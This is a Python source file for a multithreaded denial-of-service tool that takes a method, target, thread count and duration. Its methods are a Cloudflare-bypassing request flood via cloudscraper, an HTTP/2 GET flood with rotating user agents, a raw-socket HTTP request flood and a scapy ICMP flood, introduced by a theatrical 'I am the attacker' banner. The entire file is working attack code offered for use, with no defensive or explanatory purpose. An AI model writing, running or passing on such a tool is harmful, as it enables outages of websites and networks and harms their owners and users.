from scapy.all import *
import time as t
import sys as s
import cloudscraper as c
import datetime as d
import threading as th
import random as r
import socks as sk
import ssl
import httpx as hx
import socket as so
from urllib.parse import urlparse as up
from colorama import Fore as F, init as i

i(convert=True)

_u = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile)"
]

_m = (
    "I am thou, thou art I.\n"
    "With great power comes will. You have summoned thee for thy bidding\n"
    "Very well...\n"
    "I shall do as you wish\n"
    "I am the attacker, thou art the attacked. Together, we dance in the chaos.\n"
    "Prepare thyself, for the assault begins now.\n"
)

def _speak():
    for x in _m:
        print(x, end='', flush=True)
        t.sleep(0.015)
    t.sleep(1)

def _z(n):
    e = d.datetime.now() + d.timedelta(seconds=int(n))
    while (e - d.datetime.now()).total_seconds() > 0:
        rem = int((e - d.datetime.now()).total_seconds())
        print(f"{F.MAGENTA}[*] {F.WHITE}Attack status => {rem} sec left ", end='\r', flush=True)
        t.sleep(1)
    print(f"{F.MAGENTA}[*] {F.WHITE}Attack Done!{' ' * 30}")

def _a(ip, iface="eth0", cnt=1000):
    try:
        send(IP(dst=ip)/ICMP(), iface=iface, count=cnt, verbose=0)
        print(f"\nAttack on {ip} completed with {cnt} packets sent.")
    except KeyboardInterrupt:
        print("\nInterrupted.")
    except Exception as e:
        print(f"\nError: {e}")

def _g(u):
    p = up(u)
    return {
        'uri': p.path if p.path else "/",
        'host': p.hostname,
        'scheme': p.scheme,
        'port': p.port if p.port else ("443" if p.scheme == "https" else "80")
    }

def _lc(u, thx, dur):
    e = d.datetime.now() + d.timedelta(seconds=int(dur))
    scr = c.create_scraper()
    q = []
    for _ in range(int(thx)):
        try:
            x = th.Thread(target=_cc, args=(u, e, scr))
            x.start()
            q.append(x)
        except Exception as ex:
            print(f"CFB thread error: {ex}")
    for x in q:
        x.join()

def _cc(u, end, s):
    while (end - d.datetime.now()).total_seconds() > 0:
        try:
            s.get(u, timeout=15)
        except Exception as ex:
            print(f"CFB err: {ex}")

def _lh2(u, thx, dur):
    e = d.datetime.now() + d.timedelta(seconds=int(dur))
    q = []
    for _ in range(int(thx)):
        x = th.Thread(target=_hh2, args=(u, e))
        x.start()
        q.append(x)
    for x in q:
        x.join()

def _hh2(u, end):
    h = {
        'User-Agent': r.choice(_u),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    cli = hx.Client(http2=True)
    while (end - d.datetime.now()).total_seconds() > 0:
        try:
            cli.get(u, headers=h)
        except Exception as ex:
            print(f"H2 err: {ex}")

def _ls(u, thx, dur):
    tgt = _g(u)
    e = d.datetime.now() + d.timedelta(seconds=int(dur))
    rq = (
        f"GET {tgt['uri']} HTTP/1.1\r\n"
        f"Host: {tgt['host']}\r\n"
        f"User-Agent: {r.choice(_u)}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        "Connection: Keep-Alive\r\n\r\n"
    )
    q = []
    for _ in range(int(thx)):
        try:
            x = th.Thread(target=_sc, args=(tgt, e, rq))
            x.start()
            q.append(x)
        except Exception as ex:
            print(f"SOC thread error: {ex}")
    for x in q:
        x.join()

def _sc(tgt, end, rq):
    try:
        if tgt['scheme'] == 'https':
            sck = sk.socksocket()
            sck.setsockopt(so.IPPROTO_TCP, so.TCP_NODELAY, 1)
            sck.connect((str(tgt['host']), int(tgt['port'])))
            sck = ssl.create_default_context().wrap_socket(sck, server_hostname=tgt['host'])
        else:
            sck = sk.socksocket()
            sck.setsockopt(so.IPPROTO_TCP, so.TCP_NODELAY, 1)
            sck.connect((str(tgt['host']), int(tgt['port'])))
    except Exception as e:
        print(f"Conn err: {e}")
        return
    while (end - d.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(100):
                sck.send(str.encode(rq))
        except Exception as ex:
            print(f"SOC err: {ex}")
            sck.close()
            break

if __name__ == '__main__':
    if len(s.argv) != 5:
        print("Usage: python arsene_dos2.py <method> <target> <threads> <time>")
        s.exit(1)

    m, tgt, thx, dur = s.argv[1].strip().lower(), s.argv[2].strip(), s.argv[3].strip(), s.argv[4].strip()

    if m in ["cfb", "http2", "soc", "arsene"]:
        _speak()
        tim = th.Thread(target=_z, args=(dur,))
        tim.start()

        if m == "cfb":
            _lc(tgt, thx, dur)
        elif m == "http2":
            _lh2(tgt, thx, dur)
        elif m == "soc":
            _ls(tgt, thx, dur)
        elif m == "arsene":
            _a(tgt)

        tim.join()
    else:
        print("Method not found. Use: cfb, http2, soc, arsene")
